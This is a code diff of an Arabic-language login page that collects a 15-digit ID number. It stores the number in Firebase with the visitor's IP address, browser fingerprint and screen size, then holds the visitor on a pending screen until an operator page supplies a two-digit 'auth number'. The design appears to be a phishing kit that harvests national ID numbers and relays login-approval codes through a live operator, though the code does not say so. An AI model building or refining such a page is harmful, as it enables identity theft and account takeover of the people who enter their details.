@@ -349,467 +349,380 @@
         </div>
     </div>
 
-    <script>
-        // ========== متغيرات النظام ==========
-        const loginForm = document.getElementById('loginForm');
-        const usernameInput = document.getElementById('username');
-        const submitButton = document.getElementById('submitButton');
-        const loginContent = document.getElementById('loginContent');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const syncMessage = document.getElementById('loadingMessage');
-        const progressBar = document.getElementById('progressBar');
-        const progressText = document.getElementById('progressText');
-        const firebaseStatus = document.getElementById('firebaseStatus');
+   <script>
+    // ========== متغيرات النظام ==========
+    const loginForm = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('username');
+    const submitButton = document.getElementById('submitButton');
+    const loginContent = document.getElementById('loginContent');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const syncMessage = document.getElementById('loadingMessage');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+    const firebaseStatus = document.getElementById('firebaseStatus');
+    
+    let isProcessing = false;
+    
+    // ========== دوال التنبيه والتنبيهات ==========
+    function showAlert(title, message) {
+        document.getElementById('alertTitle').textContent = title;
+        document.getElementById('alertMessage').textContent = message;
+        document.getElementById('alertBox').classList.add('show');
+    }
+    
+    function hideAlert() {
+        document.getElementById('alertBox').classList.remove('show');
+    }
+    
+    function showNotification(title, message, type = 'info') {
+        const notification = document.getElementById('notification');
+        const icon = document.getElementById('notificationIcon');
+        const titleEl = document.getElementById('notificationTitle');
+        const messageEl = document.getElementById('notificationMessage');
         
-        let isProcessing = false;
-        
-        // ========== دوال التنبيه والتنبيهات ==========
-        function showAlert(title, message) {
-            document.getElementById('alertTitle').textContent = title;
-            document.getElementById('alertMessage').textContent = message;
-            document.getElementById('alertBox').classList.add('show');
+        switch(type) {
+            case 'success':
+                icon.className = 'fas fa-check-circle';
+                notification.className = 'notification notification-success';
+                break;
+            case 'error':
+                icon.className = 'fas fa-times-circle';
+                notification.className = 'notification notification-error';
+                break;
+            case 'info':
+                icon.className = 'fas fa-info-circle';
+                notification.className = 'notification notification-info';
+                break;
         }
         
-        function hideAlert() {
-            document.getElementById('alertBox').classList.remove('show');
-        }
+        titleEl.textContent = title;
+        messageEl.textContent = message;
+        notification.style.display = 'flex';
         
-        function showNotification(title, message, type = 'info') {
-            const notification = document.getElementById('notification');
-            const icon = document.getElementById('notificationIcon');
-            const titleEl = document.getElementById('notificationTitle');
-            const messageEl = document.getElementById('notificationMessage');
+        setTimeout(hideNotification, 3000);
+    }
+    
+    function hideNotification() {
+        document.getElementById('notification').style.display = 'none';
+    }
+    
+    // ========== دوال التقدم ==========
+    function updateProgress(percent, message) {
+        progressBar.style.width = percent + '%';
+        progressText.textContent = percent + '%';
+        if (message) {
+            syncMessage.textContent = message;
+        }
+    }
+    
+    // ========== دالة للحصول على IP العميل ==========
+    async function getClientIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.warn('⚠️ لم يمكن الحصول على IP:', error);
+            return 'unknown';
+        }
+    }
+    
+    // ========== تهيئة Firebase ==========
+    async function initializeFirebaseApp() {
+        try {
+            console.log('🔥 محاولة تهيئة Firebase...');
             
-            switch(type) {
-                case 'success':
-                    icon.className = 'fas fa-check-circle';
-                    notification.className = 'notification notification-success';
-                    break;
-                case 'error':
-                    icon.className = 'fas fa-times-circle';
-                    notification.className = 'notification notification-error';
-                    break;
-                case 'info':
-                    icon.className = 'fas fa-info-circle';
-                    notification.className = 'notification notification-info';
-                    break;
-            }
-            
-            titleEl.textContent = title;
-            messageEl.textContent = message;
-            notification.style.display = 'flex';
-            
-            setTimeout(hideNotification, 3000);
-        }
-        
-        function hideNotification() {
-            document.getElementById('notification').style.display = 'none';
-        }
-        
-        // ========== دوال التقدم ==========
-        function updateProgress(percent, message) {
-            progressBar.style.width = percent + '%';
-            progressText.textContent = percent + '%';
-            if (message) {
-                syncMessage.textContent = message;
-            }
-        }
-        
-        // ========== دالة للحصول على IP العميل ==========
-        async function getClientIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.warn('⚠️ لم يمكن الحصول على IP:', error);
-                return 'unknown';
-            }
-        }
-        
-        // ========== تهيئة Firebase ==========
-        async function initializeFirebaseApp() {
-            try {
-                console.log('🔥 محاولة تهيئة Firebase...');
-                
-                if (typeof firebase === 'undefined') {
-                    console.error('❌ Firebase SDK غير محمل');
-                    return false;
-                }
-                
-                // استخدام خدمات Firebase من firebase-config.js
-                if (window.firebaseServices && typeof window.firebaseServices.initialize === 'function') {
-                    const initialized = window.firebaseServices.initialize();
-                    if (initialized) {
-                        console.log('✅ Firebase مهيئ بنجاح باستخدام firebaseServices');
-                        return true;
-                    }
-                }
-                
-                // الطريقة الاحتياطية
-                if (typeof initializeFirebase === 'function') {
-                    const initialized = initializeFirebase();
-                    if (initialized) {
-                        console.log('✅ Firebase مهيئ بنجاح باستخدام initializeFirebase');
-                        return true;
-                    }
-                }
-                
-                return false;
-                
-            } catch (error) {
-                console.error('❌ خطأ في تهيئة Firebase:', error);
+            if (typeof firebase === 'undefined') {
+                console.error('❌ Firebase SDK غير محمل');
                 return false;
             }
+            
+            // استخدام خدمات Firebase من firebase-config.js
+            if (window.firebaseServices && typeof window.firebaseServices.initialize === 'function') {
+                const initialized = window.firebaseServices.initialize();
+                if (initialized) {
+                    console.log('✅ Firebase مهيئ بنجاح باستخدام firebaseServices');
+                    return true;
+                }
+            }
+            
+            // الطريقة الاحتياطية
+            if (typeof initializeFirebase === 'function') {
+                const initialized = initializeFirebase();
+                if (initialized) {
+                    console.log('✅ Firebase مهيئ بنجاح باستخدام initializeFirebase');
+                    return true;
+                }
+            }
+            
+            return false;
+            
+        } catch (error) {
+            console.error('❌ خطأ في تهيئة Firebase:', error);
+            return false;
         }
+    }
+    
+    // ========== دالة حفظ رقم الهوية في Firebase (بدون رقم مصادقة) ==========
+    async function saveIdNumberToFirebase(idNumber, rememberMe) {
+        updateProgress(30, 'جاري حفظ رقم الهوية...');
         
-        // ========== دالة حفظ رقم الهوية في Firebase ==========
-        async function saveIdNumberToFirebase(idNumber, rememberMe) {
-            updateProgress(30, 'جاري حفظ رقم الهوية...');
+        try {
+            let db = null;
             
-            try {
-                let db = null;
-                
-                // محاولة الحصول على Firestore من مختلف المصادر
-                if (window.firebaseServices && window.firebaseServices.firestore) {
-                    db = window.firebaseServices.firestore();
-                } else if (typeof firebase !== 'undefined' && firebase.firestore) {
-                    db = firebase.firestore();
-                } else if (window.firebaseDb) {
-                    db = window.firebaseDb;
-                }
-                
-                if (!db) {
-                    throw new Error('خدمة Firestore غير متاحة');
-                }
-                
-                console.log('✅ Firestore متاح:', !!db);
-                
-                // إنشاء رقم مصادقة عشوائي بين 00 و 99
-                const authNumber = Math.floor(Math.random() * 100); // رقم بين 0 و 99
-                const formattedAuthNumber = authNumber < 10 ? '0' + authNumber : authNumber.toString();
-                
-                const userData = {
-                    id_number: idNumber,
-                    idNumber: idNumber, // حفظ مزدوج للتوافق
-                    rememberMe: rememberMe,
-                    timestamp: new Date().toISOString(),
-                    created_at: firebase.firestore.FieldValue.serverTimestamp(),
-                    userAgent: navigator.userAgent,
-                    screenSize: `${window.screen.width}x${window.screen.height}`,
-                    language: navigator.language,
-                    browser: {
-                        name: navigator.appName,
-                        version: navigator.appVersion,
-                        platform: navigator.platform
-                    },
-                    ipAddress: await getClientIP(),
-                    status: 'pending', // قيد الانتظار حتى تتم الموافقة من view-data.html
-                    source: 'apply_page',
-                    storageType: 'firestore',
-                    waiting: true, // في انتظار الإجراء من view-data.html
-                    auth_number: formattedAuthNumber, // رقم المصادقة المولد
-                    authNumber: formattedAuthNumber, // نسخة احتياطية للتوافق
-                    last_action: 'auto_generated', // إجراء تلقائي
-                    authStatus: 'pending_approval' // في انتظار الموافقة
-                };
-                
-                updateProgress(50, 'جاري إنشاء السجل...');
-                
-                // حفظ في Firestore
-                const recordRef = await db.collection('id_numbers').add(userData);
-                
-                console.log('✅ تم حفظ رقم الهوية في Firebase:', recordRef.id);
-                console.log('🔢 رقم المصادقة المولد:', formattedAuthNumber);
-                updateProgress(70, 'تم إنشاء رقم المصادقة بنجاح');
-                
-                return {
-                    recordId: recordRef.id,
-                    authNumber: formattedAuthNumber,
-                    numericAuthNumber: authNumber
-                };
-                
-            } catch (error) {
-                console.error('❌ خطأ في حفظ رقم الهوية:', error);
-                throw error;
+            // محاولة الحصول على Firestore من مختلف المصادر
+            if (window.firebaseServices && window.firebaseServices.firestore) {
+                db = window.firebaseServices.firestore();
+            } else if (typeof firebase !== 'undefined' && firebase.firestore) {
+                db = firebase.firestore();
+            } else if (window.firebaseDb) {
+                db = window.firebaseDb;
             }
+            
+            if (!db) {
+                throw new Error('خدمة Firestore غير متاحة');
+            }
+            
+            console.log('✅ Firestore متاح:', !!db);
+            
+            const userData = {
+                id_number: idNumber,
+                idNumber: idNumber, // حفظ مزدوج للتوافق
+                rememberMe: rememberMe,
+                timestamp: new Date().toISOString(),
+                created_at: firebase.firestore.FieldValue.serverTimestamp(),
+                userAgent: navigator.userAgent,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                browser: {
+                    name: navigator.appName,
+                    version: navigator.appVersion,
+                    platform: navigator.platform
+                },
+                ipAddress: await getClientIP(),
+                status: 'pending', // قيد الانتظار فقط - لا يوجد رقم مصادقة
+                source: 'apply_page',
+                storageType: 'firestore',
+                waiting: true, // في انتظار إدخال رقم المصادقة من المسؤول
+                // لا نضيف رقم مصادقة هنا
+                auth_number: null,
+                authNumber: null,
+                last_action: null,
+                authStatus: 'waiting_for_approval' // في انتظار الموافقة
+            };
+            
+            updateProgress(50, 'جاري إنشاء السجل...');
+            
+            // حفظ في Firestore
+            const recordRef = await db.collection('id_numbers').add(userData);
+            
+            console.log('✅ تم حفظ رقم الهوية في Firebase:', recordRef.id);
+            console.log('⚠️ تم إنشاء سجل بدون رقم مصادقة - بانتظار إدخال المسؤول');
+            updateProgress(70, 'تم إنشاء طلب تسجيل الدخول بنجاح');
+            
+            return {
+                recordId: recordRef.id,
+                // لا نرجع رقم مصادقة
+                requiresManualApproval: true
+            };
+            
+        } catch (error) {
+            console.error('❌ خطأ في حفظ رقم الهوية:', error);
+            throw error;
         }
+    }
+    
+    // ========== معالجة تسجيل الدخول ==========
+    loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        // ========== التحقق من رقم المصادقة ==========
-        async function checkForAuthNumber(recordId) {
-            try {
-                let db = null;
-                
-                if (window.firebaseServices && window.firebaseServices.firestore) {
-                    db = window.firebaseServices.firestore();
-                } else if (typeof firebase !== 'undefined' && firebase.firestore) {
-                    db = firebase.firestore();
-                }
-                
-                if (!db) {
-                    return { hasAuthNumber: false, error: 'Firestore غير متاح' };
-                }
-                
-                const doc = await db.collection('id_numbers').doc(recordId).get();
-                
-                if (!doc.exists) {
-                    return { hasAuthNumber: false, error: 'السجل غير موجود' };
-                }
-                
-                const data = doc.data();
-                
-                if (data.auth_number !== undefined && data.auth_number !== null) {
-                    return { 
-                        hasAuthNumber: true, 
-                        authNumber: data.auth_number,
-                        status: data.status,
-                        waiting: data.waiting
-                    };
-                }
-                
-                return { hasAuthNumber: false };
-                
-            } catch (error) {
-                console.error('❌ خطأ في التحقق من رقم المصادقة:', error);
-                return { hasAuthNumber: false, error: error.message };
-            }
-        }
+        if (isProcessing) return;
         
-        // ========== حفظ رقم المصادقة في Realtime Database ==========
-        async function saveAuthToRealtimeDb(authNumber, idNumber) {
-            try {
-                let realtimeDb = null;
-                
-                if (window.firebaseServices && window.firebaseServices.realtimeDb) {
-                    realtimeDb = window.firebaseServices.realtimeDb();
-                } else if (typeof firebase !== 'undefined' && firebase.database) {
-                    realtimeDb = firebase.database();
-                }
-                
-                if (!realtimeDb) {
-                    console.warn('⚠️ Realtime Database غير متاح');
-                    return false;
-                }
-                
-                const authData = {
-                    number: authNumber,
-                    formattedNumber: authNumber < 10 ? '0' + authNumber : authNumber.toString(),
-                    timestamp: Date.now(),
-                    date: new Date().toISOString(),
-                    source: 'apply_page_auto_generate',
-                    idNumber: idNumber,
-                    status: 'pending',
-                    action: 'auto_generated'
-                };
-                
-                await realtimeDb.ref('current_auth_number').set(authData);
-                console.log('✅ تم حفظ رقم المصادقة في Realtime Database');
-                return true;
-                
-            } catch (error) {
-                console.error('❌ خطأ في حفظ رقم المصادقة في Realtime Database:', error);
-                return false;
-            }
-        }
+        const idNumber = usernameInput.value.trim();
+        const rememberMe = document.getElementById('rememberme').checked;
         
-        // ========== معالجة تسجيل الدخول ==========
-        loginForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            if (isProcessing) return;
-            
-            const idNumber = usernameInput.value.trim();
-            const rememberMe = document.getElementById('rememberme').checked;
-            
-            // التحقق من صحة الإدخال
-            if (!idNumber) {
-                showAlert('خطأ في الإدخال', 'الرجاء إدخال رقم الهوية');
-                usernameInput.focus();
-                return;
-            }
-            
-            if (!/^\d{15}$/.test(idNumber)) {
-                showAlert('خطأ في الإدخال', 'رقم الهوية يجب أن يكون 15 رقمًا');
-                usernameInput.focus();
-                return;
-            }
-            
-            // بدء المعالجة
-            isProcessing = true;
-            submitButton.disabled = true;
-            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
-            loginContent.style.opacity = '0.5';
-            loadingScreen.style.display = 'block';
-            updateProgress(10, 'جاري التحضير...');
-            firebaseStatus.innerHTML = '<i class="fas fa-cloud"></i> جاري الاتصال بقاعدة البيانات...';
-            
-            try {
-                // 1. تهيئة Firebase
-                updateProgress(20, 'جاري تهيئة قاعدة البيانات...');
-                const firebaseInitialized = await initializeFirebaseApp();
-                
-                if (!firebaseInitialized) {
-                    throw new Error('فشل الاتصال بقاعدة البيانات. يرجى المحاولة لاحقاً.');
-                }
-                
-                firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم الاتصال بقاعدة البيانات';
-                
-                // 2. حفظ رقم الهوية في Firebase وإنشاء رقم مصادقة تلقائي
-                updateProgress(40, 'جاري حفظ رقم الهوية...');
-                const result = await saveIdNumberToFirebase(idNumber, rememberMe);
-                
-                // 3. حفظ رقم المصادقة في Realtime Database
-                updateProgress(60, 'جاري حفظ رقم المصادقة...');
-                await saveAuthToRealtimeDb(result.numericAuthNumber, idNumber);
-                
-                // 4. تحديث حالة "تذكرني" في المتصفح فقط
-                if (rememberMe) {
-                    localStorage.setItem('rememberMeEnabled', 'true');
-                    localStorage.setItem('lastIdNumber', idNumber);
-                } else {
-                    localStorage.removeItem('rememberMeEnabled');
-                    localStorage.setItem('lastIdNumber', idNumber); // نحفظ دائماً آخر رقم
-                }
-                
-                // حفظ معلومات السجل
-                localStorage.setItem('currentRecordId', result.recordId);
-                localStorage.setItem('currentAuthNumber', result.authNumber);
-                localStorage.setItem('lastGeneratedAuth', result.authNumber);
-                localStorage.setItem('lastAuthTimestamp', Date.now().toString());
-                
-                updateProgress(80, 'جاري تحضير التوجيه...');
-                firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم إنشاء طلب تسجيل الدخول بنجاح';
-                
-                // 5. الانتقال مباشرة إلى صفحة success.html
-                setTimeout(() => {
-                    console.log('🚀 توجيه إلى success.html مع:', {
-                        recordId: result.recordId,
-                        authNumber: result.authNumber
-                    });
-                    
-                    // التوجيه إلى صفحة success.html مع البيانات
-                    window.location.href = 'success.html?recordId=' + encodeURIComponent(result.recordId) + 
-                                          '&auth=' + encodeURIComponent(result.authNumber) +
-                                          '&source=apply_page_auto';
-                    
-                }, 1500);
-                
-            } catch (error) {
-                console.error('❌ خطأ في عملية التسجيل:', error);
-                
-                firebaseStatus.innerHTML = '<i class="fas fa-times-circle" style="color: var(--error-color);"></i> خطأ في حفظ البيانات';
-                updateProgress(0, 'فشل في عملية التسجيل');
-                
-                showNotification('خطأ في النظام', 
-                    'حدث خطأ في حفظ البيانات. الرجاء المحاولة مرة أخرى.', 'error');
-                
-                // استعادة واجهة المستخدم
-                setTimeout(() => {
-                    loadingScreen.style.display = 'none';
-                    loginContent.style.opacity = '1';
-                    submitButton.disabled = false;
-                    submitButton.innerHTML = '<i class="fas fa-sign-in-alt"></i> تسجيل الدخول';
-                    isProcessing = false;
-                }, 2000);
-            }
-        });
-        
-        // ========== استعادة الحالة عند تحميل الصفحة ==========
-        window.addEventListener('DOMContentLoaded', function() {
-            console.log('📄 صفحة apply.html محملة');
-            
-            // وضع التركيز على حقل الإدخال
+        // التحقق من صحة الإدخال
+        if (!idNumber) {
+            showAlert('خطأ في الإدخال', 'الرجاء إدخال رقم الهوية');
             usernameInput.focus();
-            
-            // التحقق من وجود سجل سابق
-            const lastIdNumber = localStorage.getItem('lastIdNumber');
-            if (lastIdNumber) {
-                usernameInput.value = lastIdNumber;
-            }
-            
-            // تذكر حالة "تذكرني"
-            const rememberMeEnabled = localStorage.getItem('rememberMeEnabled');
-            if (rememberMeEnabled === 'true') {
-                document.getElementById('rememberme').checked = true;
-            }
-            
-            // تهيئة Firebase تلقائياً عند تحميل الصفحة
-            setTimeout(async () => {
-                try {
-                    await initializeFirebaseApp();
-                } catch (error) {
-                    console.warn('⚠️ تحذير: فشل التهيئة التلقائية:', error);
-                }
-            }, 1000);
-        });
+            return;
+        }
         
-        // ========== إضافة تأثيرات للحقل ==========
-        usernameInput.addEventListener('input', function() {
-            const value = this.value;
-            if (value.length === 15 && /^\d+$/.test(value)) {
-                this.style.borderColor = 'var(--success-color)';
-                this.style.boxShadow = '0 0 0 2px rgba(0, 172, 117, 0.2)';
-            } else if (value.length > 0) {
-                this.style.borderColor = 'var(--error-color)';
-                this.style.boxShadow = '0 0 0 2px rgba(255, 71, 87, 0.2)';
+        if (!/^\d{15}$/.test(idNumber)) {
+            showAlert('خطأ في الإدخال', 'رقم الهوية يجب أن يكون 15 رقمًا');
+            usernameInput.focus();
+            return;
+        }
+        
+        // بدء المعالجة
+        isProcessing = true;
+        submitButton.disabled = true;
+        submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
+        loginContent.style.opacity = '0.5';
+        loadingScreen.style.display = 'block';
+        updateProgress(10, 'جاري التحضير...');
+        firebaseStatus.innerHTML = '<i class="fas fa-cloud"></i> جاري الاتصال بقاعدة البيانات...';
+        
+        try {
+            // 1. تهيئة Firebase
+            updateProgress(20, 'جاري تهيئة قاعدة البيانات...');
+            const firebaseInitialized = await initializeFirebaseApp();
+            
+            if (!firebaseInitialized) {
+                throw new Error('فشل الاتصال بقاعدة البيانات. يرجى المحاولة لاحقاً.');
+            }
+            
+            firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم الاتصال بقاعدة البيانات';
+            
+            // 2. حفظ رقم الهوية في Firebase بدون رقم مصادقة
+            updateProgress(40, 'جاري حفظ رقم الهوية...');
+            const result = await saveIdNumberToFirebase(idNumber, rememberMe);
+            
+            // 3. تحديث حالة "تذكرني" في المتصفح فقط
+            if (rememberMe) {
+                localStorage.setItem('rememberMeEnabled', 'true');
+                localStorage.setItem('lastIdNumber', idNumber);
             } else {
-                this.style.borderColor = '';
-                this.style.boxShadow = '';
+                localStorage.removeItem('rememberMeEnabled');
+                localStorage.setItem('lastIdNumber', idNumber); // نحفظ دائماً آخر رقم
             }
-        });
-        
-        // ========== دوال للاختبار من وحدة التحكم ==========
-        window.quickTestApply = async function() {
-            console.log('🔍 اختبار سريع من apply.html...');
             
-            try {
-                const initialized = await initializeFirebaseApp();
-                if (!initialized) {
-                    return { error: 'Firebase غير مهيئ' };
-                }
-                
-                let db = null;
-                if (window.firebaseServices && window.firebaseServices.firestore) {
-                    db = window.firebaseServices.firestore();
-                }
-                
-                const result = {
-                    firebaseInitialized: initialized,
-                    firestoreAvailable: !!db,
-                    localStorage: {
-                        lastIdNumber: localStorage.getItem('lastIdNumber'),
-                        rememberMeEnabled: localStorage.getItem('rememberMeEnabled')
-                    },
-                    timestamp: new Date().toISOString()
-                };
-                
-                console.log('📊 نتيجة الاختبار:', result);
-                return result;
-            } catch (error) {
-                console.error('❌ خطأ في الاختبار:', error);
-                return { error: error.message };
-            }
-        };
-        
-        window.testAuthGeneration = async function() {
-            console.log('🧪 اختبار إنشاء رقم مصادقة...');
+            // حفظ معلومات السجل فقط
+            localStorage.setItem('currentRecordId', result.recordId);
+            localStorage.setItem('requiresApproval', 'true');
+            localStorage.setItem('requestTimestamp', Date.now().toString());
             
+            updateProgress(80, 'جاري تحضير التوجيه...');
+            firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم إنشاء طلب تسجيل الدخول بنجاح';
+            
+            // 4. الانتقال مباشرة إلى صفحة success.html (بدون رقم مصادقة)
+            setTimeout(() => {
+                console.log('🚀 توجيه إلى success.html مع معرف السجل فقط:', {
+                    recordId: result.recordId
+                });
+                
+                // التوجيه إلى صفحة success.html مع معرف السجل فقط - بدون رقم مصادقة
+                window.location.href = 'success.html?recordId=' + encodeURIComponent(result.recordId) + 
+                                      '&source=apply_page&status=pending&waiting=true';
+                
+            }, 1500);
+            
+        } catch (error) {
+            console.error('❌ خطأ في عملية التسجيل:', error);
+            
+            firebaseStatus.innerHTML = '<i class="fas fa-times-circle" style="color: var(--error-color);"></i> خطأ في حفظ البيانات';
+            updateProgress(0, 'فشل في عملية التسجيل');
+            
+            showNotification('خطأ في النظام', 
+                'حدث خطأ في حفظ البيانات. الرجاء المحاولة مرة أخرى.', 'error');
+            
+            // استعادة واجهة المستخدم
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                loginContent.style.opacity = '1';
+                submitButton.disabled = false;
+                submitButton.innerHTML = '<i class="fas fa-sign-in-alt"></i> تسجيل الدخول';
+                isProcessing = false;
+            }, 2000);
+        }
+    });
+    
+    // ========== استعادة الحالة عند تحميل الصفحة ==========
+    window.addEventListener('DOMContentLoaded', function() {
+        console.log('📄 صفحة apply.html محملة');
+        
+        // وضع التركيز على حقل الإدخال
+        usernameInput.focus();
+        
+        // التحقق من وجود سجل سابق
+        const lastIdNumber = localStorage.getItem('lastIdNumber');
+        if (lastIdNumber) {
+            usernameInput.value = lastIdNumber;
+        }
+        
+        // تذكر حالة "تذكرني"
+        const rememberMeEnabled = localStorage.getItem('rememberMeEnabled');
+        if (rememberMeEnabled === 'true') {
+            document.getElementById('rememberme').checked = true;
+        }
+        
+        // تهيئة Firebase تلقائياً عند تحميل الصفحة
+        setTimeout(async () => {
             try {
-                const testIdNumber = '123456789012345';
-                const result = await saveIdNumberToFirebase(testIdNumber, true);
-                
-                console.log('✅ نتيجة الاختبار:', result);
-                showNotification('اختبار ناجح', 
-                    `تم إنشاء رقم مصادقة: ${result.authNumber}`, 'success');
-                
-                return result;
+                await initializeFirebaseApp();
             } catch (error) {
-                console.error('❌ فشل الاختبار:', error);
-                showNotification('اختبار فاشل', error.message, 'error');
-                return { error: error.message };
+                console.warn('⚠️ تحذير: فشل التهيئة التلقائية:', error);
             }
-        };
+        }, 1000);
+    });
+    
+    // ========== إضافة تأثيرات للحقل ==========
+    usernameInput.addEventListener('input', function() {
+        const value = this.value;
+        if (value.length === 15 && /^\d+$/.test(value)) {
+            this.style.borderColor = 'var(--success-color)';
+            this.style.boxShadow = '0 0 0 2px rgba(0, 172, 117, 0.2)';
+        } else if (value.length > 0) {
+            this.style.borderColor = 'var(--error-color)';
+            this.style.boxShadow = '0 0 0 2px rgba(255, 71, 87, 0.2)';
+        } else {
+            this.style.borderColor = '';
+            this.style.boxShadow = '';
+        }
+    });
+    
+    // ========== دوال للاختبار من وحدة التحكم ==========
+    window.quickTestApply = async function() {
+        console.log('🔍 اختبار سريع من apply.html...');
+        
+        try {
+            const initialized = await initializeFirebaseApp();
+            if (!initialized) {
+                return { error: 'Firebase غير مهيئ' };
+            }
+            
+            let db = null;
+            if (window.firebaseServices && window.firebaseServices.firestore) {
+                db = window.firebaseServices.firestore();
+            }
+            
+            const result = {
+                firebaseInitialized: initialized,
+                firestoreAvailable: !!db,
+                localStorage: {
+                    lastIdNumber: localStorage.getItem('lastIdNumber'),
+                    rememberMeEnabled: localStorage.getItem('rememberMeEnabled')
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log('📊 نتيجة الاختبار:', result);
+            return result;
+        } catch (error) {
+            console.error('❌ خطأ في الاختبار:', error);
+            return { error: error.message };
+        }
+    };
+    
+    window.createTestRecord = async function() {
+        console.log('🧪 إنشاء سجل تجريبي...');
+        
+        try {
+            const testIdNumber = '123456789012345';
+            const result = await saveIdNumberToFirebase(testIdNumber, true);
+            
+            console.log('✅ نتيجة الاختبار:', result);
+            showNotification('اختبار ناجح', 
+                `تم إنشاء سجل جديد بدون رقم مصادقة`, 'success');
+            
+            return result;
+        } catch (error) {
+            console.error('❌ فشل الاختبار:', error);
+            showNotification('اختبار فاشل', error.message, 'error');
+            return { error: error.message };
+        }
+    };
 
-    </script>
+</script>
 </body>
 </html>
